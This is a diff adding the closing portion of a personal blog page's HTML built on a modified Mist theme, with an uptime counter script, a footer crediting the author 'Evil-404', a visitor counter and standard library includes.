+                    <a href="http://www.4hou.com" title="RoarTalk" target="_blank">RoarTalk</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+       
+      
+
+      
+
+<div id="days"></div>
+</script>
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("07/01/2018 15:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evil-404</span>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共284.8k字</span>
+</div>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://evil-404.github.io/">Evil-404</a> 维护</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">BY &mdash; <a class="theme-link" target="_blank" href="https://evil-404.github.io/">修改版.Mist</a> v</div>
+
+
+
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v="></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
